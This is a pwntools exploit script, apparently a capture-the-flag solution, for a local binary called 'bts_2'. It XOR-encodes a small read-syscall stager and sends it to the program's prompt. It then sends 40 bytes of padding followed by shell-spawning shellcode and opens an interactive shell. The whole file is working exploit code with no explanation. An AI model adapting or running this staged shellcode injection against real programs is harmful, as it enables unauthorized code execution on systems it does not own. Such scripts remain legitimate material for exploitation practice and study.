from pwn import *

elf = context.binary = ELF('./bts_2')
#context.terminal = ["tmux", "splitw", "-h"]
p = process(elf.path)
gdbs = """break * 0x08049498"""
#gdb.attach(p, gdbscript=gdbs)
sc = asm("""
        xor eax,eax
        xor ebx,ebx
        lea ecx,[esp+0x4]
        mov al,0x3
        int 0x80
""")
pay = b""
for i in range(len(sc)):
    pay += xor(i, sc[i])

p.sendafter(b'> ', pay)
offset = 40
pay = b"A" * offset + asm(shellcraft.sh())
p.send(pay)
p.interactive()
